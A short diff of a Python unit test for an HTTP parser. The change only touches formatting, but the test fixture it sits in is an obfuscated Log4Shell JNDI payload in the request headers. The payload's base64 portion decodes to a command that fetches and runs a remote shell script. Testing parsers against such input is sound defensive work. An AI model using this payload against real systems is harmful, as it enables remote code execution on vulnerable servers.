@@ -781,7 +781,8 @@ class TestHttpParser(unittest.TestCase):
             b'Cookie: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
             b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
             b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}' +
-            b'\r\n\r\n')
+            b'\r\n\r\n',
+        )
         self.assertEqual(
             self.parser.header(b'user-agent'),
             b'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
